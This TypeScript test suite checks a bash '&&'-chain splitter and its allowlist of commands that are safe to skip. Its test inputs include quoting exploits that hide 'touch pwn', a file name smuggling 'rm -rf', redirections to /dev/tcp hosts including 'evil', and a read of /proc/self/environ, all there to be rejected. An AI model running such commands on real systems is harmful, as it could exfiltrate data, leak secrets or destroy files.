import { spawnSync } from "node:child_process";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  readdirSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { tokenizeProgram } from "../src/program-tokens.js";
import {
  SHELL_AND_CHAIN_SPLITTER_VERSION,
  isOptionalSetupSegment,
  isSkippableSegment,
  recordedPosixShell,
  shellAndChainSegmentText,
  splitShellAndChain,
} from "../src/shell-and-chain.js";

/** The report chains the monthly-report sessions ran, with their recorded values. */
/** The backup job a demo session ran as one chain, writing its checksum through a redirection. */
const BACKUP =
  "mkdir -p backups/beta && tar -czf backups/beta/beta-2026-01-12.tar.gz -C data beta && sha256sum backups/beta/beta-2026-01-12.tar.gz > backups/beta/beta-2026-01-12.sha256 && sha256sum -c backups/beta/beta-2026-01-12.sha256 && tar -tzf backups/beta/beta-2026-01-12.tar.gz && cat backups/beta/beta-2026-01-12.sha256";

const REPORT =
  "mkdir -p out/EMEA-2025-03 && ./reportctl extract --db data/sales.db --region EMEA --month 2025-03 --out out/EMEA-2025-03/orders.csv && ./reportctl summarize --currency EUR --out out/EMEA-2025-03/summary.json out/EMEA-2025-03/orders.csv && ./reportctl top --n 5 --out out/EMEA-2025-03/top.json out/EMEA-2025-03/orders.csv && ./reportctl render out/EMEA-2025-03";

describe("splitting a shell && chain", () => {
  it.each([
    [
      REPORT,
      [
        "mkdir -p out/EMEA-2025-03",
        "./reportctl extract --db data/sales.db --region EMEA --month 2025-03 --out out/EMEA-2025-03/orders.csv",
        "./reportctl summarize --currency EUR --out out/EMEA-2025-03/summary.json out/EMEA-2025-03/orders.csv",
        "./reportctl top --n 5 --out out/EMEA-2025-03/top.json out/EMEA-2025-03/orders.csv",
        "./reportctl render out/EMEA-2025-03",
      ],
    ],
    [
      "./reportctl render out/a&&./reportctl validate out/a",
      ["./reportctl render out/a", "./reportctl validate out/a"],
    ],
    ["git commit -m 'a && b' && git push", ["git commit -m 'a && b'", "git push"]],
    ['git commit -m "ship it" && git push', ['git commit -m "ship it"', "git push"]],
    ["\tmake build \t&&  make test ", ["make build", "make test"]],
    ["npm run build --workspace=web && npm test", ["npm run build --workspace=web", "npm test"]],
    [
      BACKUP,
      [
        "mkdir -p backups/beta",
        "tar -czf backups/beta/beta-2026-01-12.tar.gz -C data beta",
        "sha256sum backups/beta/beta-2026-01-12.tar.gz > backups/beta/beta-2026-01-12.sha256",
        "sha256sum -c backups/beta/beta-2026-01-12.sha256",
        "tar -tzf backups/beta/beta-2026-01-12.tar.gz",
        "cat backups/beta/beta-2026-01-12.sha256",
      ],
    ],
    // Each redirection the grammar allows, attached to its segment.
    ["make > log && ls", ["make > log", "ls"]],
    ["make >log && ls", ["make >log", "ls"]],
    ["make >> log && ls", ["make >> log", "ls"]],
    ["sort < in && ls", ["sort < in", "ls"]],
    ["make 2> err && ls", ["make 2> err", "ls"]],
    ["make 2>> err && ls", ["make 2>> err", "ls"]],
    ["make 2>&1 && ls", ["make 2>&1", "ls"]],
    ["make 1>&2 && ls", ["make 1>&2", "ls"]],
    ["make >&2 && ls", ["make >&2", "ls"]],
    ["make > log 2>&1 && ls", ["make > log 2>&1", "ls"]],
    ["sort < in > out && ls", ["sort < in > out", "ls"]],
    ["make > 'my log' && ls", ["make > 'my log'", "ls"]],
    ["make > /tmp/build.log && ls", ["make > /tmp/build.log", "ls"]],
    ["make > ./out/devices.log && ls", ["make > ./out/devices.log", "ls"]],
    // The hostile target: its quoted `&&` is part of the file name, never a separator.
    ['make > "a && rm -rf b" && ls', ['make > "a && rm -rf b"', "ls"]],
  ])("splits %j at its top-level && only", (source, expected) => {
    const chain = splitShellAndChain("bash", source);
    expect(chain?.version).toBe(SHELL_AND_CHAIN_SPLITTER_VERSION);
    expect(chain?.segments.map((segment) => segment.text)).toEqual(expected);
    for (const segment of chain!.segments)
      expect(source.slice(segment.start, segment.end)).toBe(segment.text);
  });

  it.each([
    // The security review's exploits.
    ["ANSI-C quoting", "echo $'a\\' && touch pwn && echo \"' #\""],
    ["ANSI-C quoting before an external", "ls $'a\\' && touch pwn && ls \"' #\""],
    ["locale quoting", 'ls $"a" && touch pwn'],
    ["read", "read x < f && ls"],
    ["printf -v", "printf -v x hi && ls"],
    ["let", "let x=1 && ls"],
    ["shift", "shift && ls"],
    ["getopts", "getopts ab o && ls"],
    ["mapfile", "mapfile x && ls"],
    ["readarray", "readarray x && ls"],
    ["wait", "wait && ls"],
    ["disown", "disown && ls"],
    ["bind", "bind x && ls"],
    ["command -p cd", "command -p cd /tmp && ls"],
    ["builtin cd", "builtin cd /tmp && ls"],
    ["a quoted builtin", "'cd' /tmp && ls"],
    ["a double-quoted builtin", '"export" X=1 && ls'],
    ["non-breaking space", "ls a\u00a0&& ls"],
    // The grammar.
    ["one command", "./reportctl render out/a"],
    ["a parameter", "ls $HOME && ls"],
    ["a command substitution", "mkdir -p $(date +%F) && ls"],
    ["a quoted command substitution", 'ls "$(date)" && ls'],
    ["backticks", "ls `date` && ls"],
    ["a quoted backtick", 'ls "`date`" && ls'],
    ["a quoted backslash", 'ls "a\\" && ls'],
    ["a quoted bang", 'ls "a!" && ls'],
    ["a process substitution in", "diff <(ls a) b && ls"],
    ["a process substitution out", "tee >(wc -l) && ls"],
    ["a subshell", "(make) && ls"],
    ["a brace group", "{ make; } && ls"],
    ["brace expansion", "mkdir -p a/{b,c} && ls"],
    ["a background job", "make & ls && ls"],
    ["a trailing background job", "make && ls &"],
    // Redirections outside the grammar.
    ["a heredoc string", "cat <<< x && ls"],
    ["a quoted heredoc", "cat <<'EOF' && ls"],
    ["a clobbering redirection", "make >| log && ls"],
    ["an all-output redirection", "make &> log && ls"],
    ["an appending all-output redirection", "make &>> log && ls"],
    ["a read-write redirection", "sort <> f && ls"],
    ["an input duplication", "sort <&3 && ls"],
    ["another output descriptor", "make 3> log && ls"],
    ["descriptor zero", "sort 0< in && ls"],
    ["a two-digit descriptor", "make 12> log && ls"],
    ["an explicit stdout descriptor", "make 1> log && ls"],
    ["a stderr input", "make 2< in && ls"],
    ["a duplication to a word", "make >&log && ls"],
    ["a duplication to another descriptor", "make 2>&3 && ls"],
    ["a duplication glued to a word", "make 2>&1x && ls"],
    ["a duplication closing a descriptor", "make 2>&- && ls"],
    ["a redirection without a target", "make > && ls"],
    ["a trailing redirection without a target", "ls && make >"],
    ["a redirection to a redirection", "make > > log && ls"],
    ["an empty target", "make > '' && ls"],
    ["a redirection as the first word", "> log make && ls"],
    ["a redirection alone", "make && > log"],
    ["a redirection glued to a word", "make x>log && ls"],
    ["a parameter target", "make > $OUT && ls"],
    ["a glob target", "make > *.log && ls"],
    ["a tilde target", "make > ~/log && ls"],
    ["an equals target", "make > =log && ls"],
    ["a quoted parameter target", 'make > "$OUT" && ls'],
    // Special files a redirection could open instead of a plain file.
    ["a /dev/tcp output target", "curl x > /dev/tcp/1.2.3.4/80 && ls"],
    ["a /dev/tcp input target", "cat < /dev/tcp/evil/443 && ls"],
    ["a /dev/udp target", "make > /dev/udp/1.2.3.4/53 && ls"],
    ["a /dev/fd target", "make > /dev/fd/3 && ls"],
    ["a /dev/stdout target", "make > /dev/stdout && ls"],
    ["a /dev/null target", "make 2> /dev/null && ls"],
    ["a quoted /dev target", "make > '/dev/tcp/1.2.3.4/80' && ls"],
    ["a doubled-slash /dev target", "make > //dev/tcp/1.2.3.4/80 && ls"],
    ["a dotted /dev target", "make > /./dev/stdout && ls"],
    ["a /proc target", "make > /proc/self/fd/1 && ls"],
    ["a /sys target", "make > /sys/kernel/x && ls"],
    ["a parent-directory target", "make > ../log && ls"],
    ["an absolute parent-directory target", "make > /tmp/../dev/stdout && ls"],
    ["a slash-only target", "make > / && ls"],
    ["an or-list", "make || ls && ls"],
    ["a carriage return", "make &&\rls"],
    ["a comment", "make && ls # done"],
    ["a heredoc", "cat <<EOF && ls"],
    ["a line continuation", "make \\\n && ls"],
    ["an escape", "ls a\\ b && ls"],
    ["a glob", "ls *.ts && ls"],
    ["a character class", "ls a[bc] && ls"],
    ["a question glob", "ls a? && ls"],
    ["a tilde", "ls ~ && ls"],
    ["a job spec", "%1 && ls"],
    ["a caret", "ls ^a && ls"],
    ["a zsh equals expansion", "=ls && ls"],
    ["an assignment prefix", "LANG=C sort a && ls"],
    ["a bare assignment", "OUT=out/a && ls"],
    ["an option as command", "-x && ls"],
    ["an unterminated quote", "ls 'a && ls"],
    ["an empty segment", "make && && ls"],
    ["a trailing separator", "make && ls &&"],
    ["echo", "mkdir -p out && echo done"],
    ["true", "make && true"],
    ["test", "test -f a && ls"],
    ["a keyword", "if make && ls"],
    ["negation", "! make && ls"],
  ])("never splits %s", (_, source) => {
    expect(splitShellAndChain("bash", source)).toBeUndefined();
  });

  it.each([
    // The heat-pump batch: one submission per line of one command.
    [
      "python /workspace/submit_decision.py CLM-2606 request_missing_evidence REQUEST_MISSING_MAINTENANCE 0 0 CLM-2606 IMG-9104\npython /workspace/submit_decision.py CLM-2607 request_missing_evidence REQUEST_MISSING_MAINTENANCE 0 0 CLM-2607 IMG-9105",
      [
        "python /workspace/submit_decision.py CLM-2606 request_missing_evidence REQUEST_MISSING_MAINTENANCE 0 0 CLM-2606 IMG-9104",
        "python /workspace/submit_decision.py CLM-2607 request_missing_evidence REQUEST_MISSING_MAINTENANCE 0 0 CLM-2607 IMG-9105",
      ],
    ],
    ["make; ls && ls", ["make", "ls", "ls"]],
    ["make &&\nls", ["make", "ls"]],
    ["make\n\n  ls\n", ["make", "ls"]],
    ["make ;\nls;", ["make", "ls"]],
    ["make 'a;b'\nls", ["make 'a;b'", "ls"]],
  ])("splits %j at a line break or `;` from version 4", (source, expected) => {
    expect(splitShellAndChain("bash", source)?.segments.map((segment) => segment.text)).toEqual(
      expected,
    );
    expect(splitShellAndChain("bash", source, 3)).toBeUndefined();
  });

  it.each([
    ["a line break inside quotes", "make 'a\nb' && ls"],
    ["two semicolons", "make ;; ls"],
    ["a semicolon after &&", "make && ; ls"],
    ["a leading line break", "\nmake\nls"],
    ["a trailing &&", "make\nls &&\n"],
    ["a heredoc batch", "cat > s.py <<'PY'\nprint(1)\nPY\npython s.py"],
    ["one command and a line break", "make\n"],
  ])("never splits %s from version 4", (_, source) => {
    expect(splitShellAndChain("bash", source)).toBeUndefined();
  });

  it("re-splits a version-1 address under the version-1 grammar, without redirections", () => {
    const plain = "make && ls";
    const redirecting = "make > log && ls";
    expect(splitShellAndChain("bash", plain, 1)).toMatchObject({ version: 1 });
    expect(splitShellAndChain("bash", redirecting, 1)).toBeUndefined();
    expect(shellAndChainSegmentText("bash", plain, { index: 1, count: 2, version: 1 })).toBe("ls");
    expect(
      shellAndChainSegmentText("bash", redirecting, { index: 0, count: 2, version: 1 }),
    ).toBeUndefined();
    expect(shellAndChainSegmentText("bash", redirecting, { index: 0, count: 2, version: 2 })).toBe(
      "make > log",
    );
    expect(
      shellAndChainSegmentText("bash", plain, { index: 1, count: 2, version: 5 }),
    ).toBeUndefined();
  });

  it("splits a `~` inside a word from version 3, never one a shell expands", () => {
    const range = "git log --oneline HEAD~2..HEAD > notes && wc -l notes";
    expect(splitShellAndChain("bash", range)?.segments.map((segment) => segment.text)).toEqual([
      "git log --oneline HEAD~2..HEAD > notes",
      "wc -l notes",
    ]);
    // A version-2 address re-splits under the version-2 grammar, which has no `~`.
    expect(splitShellAndChain("bash", range, 2)).toBeUndefined();
    for (const expands of [
      "ls ~ && ls",
      "ls ~/src && ls",
      "cp a ~root && ls",
      "tool --dir=~/x && ls",
      "tool a:~/x && ls",
      "cat > ~/out && ls",
    ])
      expect(splitShellAndChain("bash", expands)).toBeUndefined();
  });

  it("keeps a pipeline inside its segment from version 3, never `||` or `|&`", () => {
    // Cursor's recorded manifest job, one chained Shell call.
    const manifest =
      "find assets -name '*.png' -type f | sort | xargs -r sha256sum > manifest.txt && wc -l manifest.txt && cat manifest.txt";
    expect(splitShellAndChain("bash", manifest)?.segments.map((segment) => segment.text)).toEqual([
      "find assets -name '*.png' -type f | sort | xargs -r sha256sum > manifest.txt",
      "wc -l manifest.txt",
      "cat manifest.txt",
    ]);
    expect(splitShellAndChain("bash", manifest, 2)).toBeUndefined();
    for (const never of [
      "make || ls && ls",
      "make |& sort && ls",
      "make | && ls",
      "| sort && ls",
      "make | cd x && ls",
      "make | x=1 && ls",
    ])
      expect(splitShellAndChain("bash", never)).toBeUndefined();
    // Only the first stage reads a file and only the last writes one: zsh's MULTIOS would tee
    // `a > f | b` into both the file and the pipe.
    for (const multios of [
      "gen > out.txt | wc -l && ls",
      "gen 2> err | sort && ls",
      "gen | sort < in && ls",
      "a > f | b && c",
    ])
      expect(splitShellAndChain("bash", multios)).toBeUndefined();
    expect(splitShellAndChain("bash", "sort < in | uniq > out && ls")?.segments).toHaveLength(2);
    // Cursor's Shell may run in zsh, whose EXTENDED_GLOB reads a mid-word `~` as an exclusion.
    const cursorShell = recordedPosixShell("Shell", {})!;
    expect(splitShellAndChain(cursorShell, "git log HEAD~2..HEAD > f && wc -l f")).toBeUndefined();
    expect(splitShellAndChain(cursorShell, manifest)?.segments).toHaveLength(3);
    // A pipeline only inspects nothing: it is never a skippable trailing inspection.
    expect(isSkippableSegment("cat f | head", 3, { trailing: true })).toBe(false);
  });

  it("lets a version-2 chain skip mkdir -p anywhere and a file inspection only when trailing", () => {
    const trailing = { trailing: true };
    for (const text of [
      "cat out/sum",
      "sha256sum -c out/sum",
      "ls out",
      "'cat' f",
      "grep -c x f",
    ]) {
      expect(isSkippableSegment(text, 2, trailing)).toBe(true);
      expect(isSkippableSegment(text, 2, { trailing: false })).toBe(false);
      expect(isSkippableSegment(text, 1, trailing)).toBe(false);
    }
    expect(isSkippableSegment("mkdir -p out", 1, { trailing: false })).toBe(true);
    for (const text of [
      "cat a > b",
      "cat f 2>&1",
      "LD_PRELOAD=x cat f",
      "./cat f",
      "/bin/cat f",
      "tar -tzf f",
      "sort -o f g",
      "find . -delete",
      "rm f",
      // Inspections reading stdin or a special file.
      "cat",
      "ls",
      "cat -",
      "cat f -",
      "head /dev/stdin",
      "cat /proc/self/environ",
      "grep -q x",
      "sha256sum -c",
    ])
      expect(isSkippableSegment(text, 2, trailing)).toBe(false);
  });

  it("splits only in POSIX shells", () => {
    for (const shell of ["bash", "sh", "dash"])
      expect(splitShellAndChain(shell, "make && ls")?.segments).toHaveLength(2);
    for (const shell of ["zsh", "powershell", "pwsh", "cmd", "python", "fish"])
      expect(splitShellAndChain(shell, "make && ls")).toBeUndefined();
    // zsh builtins (setopt, emulate, zmodload, ...) are never split because zsh never splits.
    expect(splitShellAndChain("zsh", "mkdir a && setopt x && ls")).toBeUndefined();
  });

  it("offers only mkdir -p of plain paths as optional setup", () => {
    expect(isOptionalSetupSegment("mkdir -p out/EMEA-2025-03")).toBe(true);
    expect(isOptionalSetupSegment("mkdir -p out/a out/b")).toBe(true);
    for (const text of [
      "mkdir out",
      "mkdir -p",
      "mkdir -p -m 700 out",
      "touch out",
      "cd out",
      "mkdir -p out > log",
      "mkdir -p out 2>&1",
      "mkdir -p a;rm",
    ])
      expect(isOptionalSetupSegment(text)).toBe(false);
  });
});

/**
 * The bash that counts runs: `/bin/bash`, or on Windows Git for Windows' MSYS bash beside the `git`
 * on PATH (never WSL's `bash.exe`). Its `usr/bin/bash.exe`, unlike the `bin/bash.exe` launcher, keeps
 * the stub-only PATH.
 */
function countingBash(): string | undefined {
  if (process.platform !== "win32") {
    return spawnSync("bash", ["-c", "true"]).status === 0 ? "/bin/bash" : undefined;
  }
  // `git --exec-path` is `<Git>/mingw64/libexec/git-core`.
  const gitCore = spawnSync("git", ["--exec-path"], { encoding: "utf8" }).stdout?.trim();
  if (!gitCore) return undefined;
  const bash = path.resolve(gitCore, "..", "..", "..", "usr", "bin", "bash.exe");
  return existsSync(bash) ? bash : undefined;
}
const bash = countingBash();

describe.runIf(bash !== undefined)("the allowlist against the commands bash runs", () => {
  /** External commands the corpus names: each is a stub that logs one line per run and succeeds. */
  const STUBS = [
    "make",
    "git",
    "npm",
    "mkdir",
    "ls",
    "touch",
    "tool",
    "reportctl",
    "tar",
    "sha256sum",
    "cat",
    "sort",
    "wc",
    "find",
    "xargs",
    "uniq",
    "tee",
  ];
  /** How many external commands bash actually runs for `source`, with every command stubbed. */
  function bashRuns(source: string): number {
    const root = mkdtempSync(path.join(tmpdir(), "resin-and-chain-runs-"));
    try {
      const bin = path.join(root, "bin");
      const log = path.join(root, "runs.log");
      mkdirSync(bin);
      const stub = `#!/bin/sh\necho x >> '${log}'\n`;
      for (const name of STUBS) writeFileSync(path.join(bin, name), stub, { mode: 0o755 });
      writeFileSync(path.join(root, "reportctl"), stub, { mode: 0o755 });
      // What the corpus's redirections read and write into; `mkdir` itself is a stub.
      writeFileSync(path.join(root, "in"), "b\na\n");
      mkdirSync(path.join(root, "backups", "beta"), { recursive: true });
      spawnSync(bash ?? "/bin/bash", ["--norc", "--noprofile", "-c", source], {
        cwd: root,
        env: { PATH: bin },
      });
      return existsSync(log) ? readFileSync(log, "utf8").split("\n").filter(Boolean).length : 0;
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  }

  const CORPUS = [
    REPORT,
    "make build && make test",
    "git add -A && git commit -m 'a && b' && git push",
    'git commit -m "x && y" && git push',
    "npm ci && npm run build --workspace=web && npm test",
    "mkdir -p out && tool --out=out/a.json",
    "echo $'a\\' && touch pwn && echo \"' #\"",
    "ls $'a\\' && touch pwn && ls \"' #\"",
    "ls 'a'\"b\" && ls",
    "make && ls # c && d",
    "ls a\\&\\&b && ls",
    "x=1 && ls",
    BACKUP,
    "make > log 2>&1 && sort < in >> log && ls 1>&2",
    "make 2> err && make 2>> err && ls >&2",
    'make > "a && touch pwn" && ls',
    "make >| log && ls",
    "make &> log && ls",
    "cat <<< x && ls",
    "make 3> log && ls",
    "git log HEAD~2..HEAD > log && wc -l log",
    "ls ~ && ls",
    "tool --dir=~/x && ls",
    "find assets -name '*.png' -type f | sort | xargs -r sha256sum > manifest && wc -l manifest",
    "sort in | uniq -c > log || ls",
    "make |& sort && ls",
    "ls | 'sort' && ls",
    "make | tee log && ls",
  ];

  it.each(CORPUS)("splits %j only into the commands bash runs", (source) => {
    const chain = splitShellAndChain("bash", source);
    // Whatever splits is exactly the commands bash ran, one segment each.
    // A segment that is a pipeline runs each of its commands.
    if (chain !== undefined) {
      const commands = chain.segments.reduce(
        (total, segment) =>
          total +
          1 +
          tokenizeProgram("shell", segment.text).filter(
            (token) => token.kind === "operator" && token.raw === "|",
          ).length,
        0,
      );
      expect(bashRuns(source)).toBe(commands);
    }
    // The review's exploit: bash runs one command where a naive split would see three.
    if (source.includes("$'")) {
      expect(chain).toBeUndefined();
      expect(bashRuns(source)).toBeLessThan(3);
    }
  });
});

describe("running a split chain's segments one after another", () => {
  /** Every file under `root` with its content, and the exit status and output of the run. */
  function run(commands: readonly string[]) {
    const root = mkdtempSync(path.join(tmpdir(), "resin-and-chain-"));
    try {
      let status = 0;
      let stdout = "";
      for (const command of commands) {
        const result = spawnSync("/bin/sh", ["-c", command], { cwd: root, encoding: "utf8" });
        stdout += result.stdout;
        status = result.status ?? -1;
        if (status !== 0) break;
      }
      const files = readdirSync(root, { recursive: true, withFileTypes: true })
        .filter((entry) => entry.isFile())
        .map((entry) => {
          const file = path.join(entry.parentPath, entry.name);
          return [path.relative(root, file), readFileSync(file, "utf8")];
        })
        .sort();
      return { status, stdout, files };
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  }

  it.each([
    "mkdir -p out/EMEA-2025-03 && touch out/EMEA-2025-03/orders.csv && ls out/EMEA-2025-03",
    "mkdir -p a && cp -r a b && ls",
    "touch first && ls missing && touch never",
    "touch 'a && b' && ls",
    "mkdir -p out && ls > out/list && sort < out/list > out/sorted && sha256sum out/sorted > out/sum && sha256sum -c out/sum && cat out/sum",
    "ls > listed 2>&1 && ls missing 2> err && touch never",
    "ls >> log && ls >> log 2>> err && ls 1>&2 && cat < log >&2",
    'ls > "a && b" && cat "a && b"',
  ])("behaves as the chain did: %s", (chain) => {
    const segments = splitShellAndChain("sh", chain)!.segments.map((segment) => segment.text);
    expect(run(segments)).toEqual(run([chain]));
  });
});
